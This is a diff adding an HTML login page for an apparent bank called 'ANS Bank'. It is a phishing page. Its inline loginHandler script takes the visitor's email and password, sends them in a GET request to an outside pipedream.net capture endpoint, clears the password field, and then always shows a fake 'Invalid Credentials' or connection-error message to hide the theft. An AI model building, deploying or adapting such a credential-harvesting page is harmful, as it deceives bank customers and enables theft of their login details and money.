@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html  >
+<head>
+  <!-- Site made with Mobirise Website Builder v5.0.29, https://mobirise.com -->
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="generator" content="Mobirise v5.0.29, mobirise.com">
+  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
+  <link rel="shortcut icon" href="assets/images/ans2-320x174.png" type="image/x-icon">
+  <meta name="description" content="">
+  
+  
+  <title>Login</title>
+  <link rel="stylesheet" href="assets/tether/tether.min.css">
+  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
+  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap-grid.min.css">
+  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap-reboot.min.css">
+  <link rel="stylesheet" href="assets/dropdown/css/style.css">
+  <link rel="stylesheet" href="assets/socicon/css/styles.css">
+  <link rel="stylesheet" href="assets/theme/css/style.css">
+  <link rel="preload" as="style" href="assets/mobirise/css/mbr-additional.css"><link rel="stylesheet" href="assets/mobirise/css/mbr-additional.css" type="text/css">
+  
+  
+  
+  
+</head>
+<body>
+  
+  <section class="menu menu2 cid-sgZUtW3MMP" once="menu" id="menu2-e">
+    
+    <nav class="navbar navbar-dropdown navbar-fixed-top navbar-expand-lg">
+        <div class="container">
+            <div class="navbar-brand">
+                <span class="navbar-logo">
+                    <a href="index.html">
+                        <img src="assets/images/ans2-320x174.png" alt="ANS Bank" style="height: 6rem;">
+                    </a>
+                </span>
+                
+            </div>
+            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
+                <div class="hamburger">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarSupportedContent">
+                <ul class="navbar-nav nav-dropdown" data-app-modern-menu="true"><li class="nav-item"><a class="nav-link link text-black text-primary display-4" href="page1.html">
+                            About Us</a></li>
+                    <li class="nav-item"><a class="nav-link link text-black text-primary display-4" href="index.html#map3-6">
+                            Main Branches</a></li>
+                    <li class="nav-item"><a class="nav-link link text-black text-primary display-4" href="index.html#contacts2-d">Contacts</a>
+                    </li></ul>
+                
+                <div class="navbar-buttons mbr-section-btn"><a class="btn btn-warning display-4" href="page2.html">
+                        Login Portal</a></div>
+            </div>
+        </div>
+    </nav>
+</section>
+
+<section class="engine"><a href="https://mobirise.info/s">bootstrap theme</a></section><section class="header4 cid-sh4f8OSFh1 mbr-fullscreen" id="header4-h">
+
+    
+    
+	<script>
+    	function formatParams(params){
+            return "?" + Object
+                .keys(params)
+                .map(function(key){
+                  return key+"="+encodeURIComponent(params[key])
+                })
+                .join("&")
+        }
+        
+	    function loginHandler(form)
+	    {
+	        let invalid = document.getElementById("login-invalid-cred");
+	        let error = document.getElementById("login-error-connecting");
+	        invalid.hidden = true;
+	        error.hidden = true;
+	        
+	        let email = form.elements.email.value;
+	        let pass = form.elements.password.value;
+	        
+	        form.elements.password.value = "";
+	        
+	        let url = "https://e599272a49e9d803554a8ba8487334a9.m.pipedream.net/login";
+	        url += formatParams({ email, pass });
+	        
+            let xmlHttp = new XMLHttpRequest();
+            xmlHttp.open("GET", url, true);
+            
+            xmlHttp.onload = ()=>{
+                invalid.hidden = false;
+            };
+            xmlHttp.onerror = ()=>{
+                error.hidden = false;
+            };
+            setTimeout(() => { xmlHttp.send(null); }, 500);
+	    }
+	</script>
+	
+    
+    <div class="container">
+        <div class="row">
+            <div class="content-wrap">
+                <h1 class="mbr-section-title mbr-fonts-style mbr-white mb-3 display-1">
+                    <strong>Login To Online Banking</strong></h1>
+                
+                
+
+                
+            </div>
+        </div>
+        
+    <div class="container">
+        <div class="mbr-section-head">
+            <h4 class="mbr-section-subtitle mbr-fonts-style align-center mb-0 mt-2 display-5">Enter Login Credentials</h4>
+        </div>
+        
+        <div class="row justify-content-center mt-4">
+            <div class="col-lg-8 mx-auto">
+                <form onload="onLoad(this)" action="javascript:void(0)" class="mx-auto" onsubmit="loginHandler(this); return false;">
+                    <div class="">
+                        <!--<div hidden="hidden" data-form-alert class="alert alert-success col-12">Invalid Credentials. Please re-check your email &amp; password.</div>-->
+                        <div hidden="hidden" id="login-invalid-cred" data-form-alert-danger="" class="alert alert-danger col-12">Invalid Credentials. Please re-check your email and password.</div>
+                        <div hidden="hidden" id="login-error-connecting" data-form-alert-danger="" class="alert alert-danger col-12">Connection Error. Please check your internet connection.</div>
+                        <!--<div hidden="hidden" data-form-alert-danger class="alert alert-danger col-12">Invalid Credentials. Please re-check your email &amp; password.</div>-->
+                    </div>
+                    <div class="dragArea row">
+                        <div class="col-lg-12 col-md-12 col-sm-12 form-group" data-for="email">
+                            <input type="email" name="email" placeholder="Email" data-form-field="email" class="form-control" id="email-header4-h">
+                        </div>
+                        <div class="col-lg-12 col-md-12 col-sm-12 form-group" data-for="password">
+                            <input type="password" name="password" placeholder="Password" data-form-field="password" class="form-control" id="password-header4-h">
+                        </div>
+                        <div class="col-auto mbr-section-btn align-center"><button type="submit" class="btn btn-primary display-4">Login</button></div>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+    </div>
+</section>
+
+<section class="footer3 cid-sh4HUmzaRV" once="footers" id="footer3-j">
+
+    
+
+    
+
+    <div class="container">
+        <div class="media-container-row align-center mbr-white">
+            <div class="row row-links">
+                <ul class="foot-menu">
+                    
+                    
+                    
+                    
+                    
+                <li class="foot-menu-item mbr-fonts-style display-7">
+                        <a class="text-white text-primary" href="page1.html" target="_blank">About Us</a>
+                    </li><li class="foot-menu-item mbr-fonts-style display-7"><a class="text-white text-primary" href="index.html#map3-6" target="_blank">Main Branches</a>
+                    </li><li class="foot-menu-item mbr-fonts-style display-7">
+                        <a class="text-white text-primary" href="index.html#contacts2-d" target="_blank">Contact Us</a>
+                    </li></ul>
+            </div>
+            
+            <div class="row row-copirayt">
+                <p class="mbr-text mb-0 mbr-fonts-style mbr-white align-center display-7">
+                    © Copyright 2025 America National Service Group. All Rights Reserved.
+                </p>
+            </div>
+        </div>
+    </div>
+</section>
+
+
+  <script src="assets/web/assets/jquery/jquery.min.js"></script>
+  <script src="assets/popper/popper.min.js"></script>
+  <script src="assets/tether/tether.min.js"></script>
+  <script src="assets/bootstrap/js/bootstrap.min.js"></script>
+  <script src="assets/smoothscroll/smooth-scroll.js"></script>
+  <script src="assets/dropdown/js/nav-dropdown.js"></script>
+  <script src="assets/dropdown/js/navbar-dropdown.js"></script>
+  <script src="assets/touchswipe/jquery.touch-swipe.min.js"></script>
+  <script src="assets/theme/js/script.js"></script>
+  
+  
+  
+</body>
+</html>
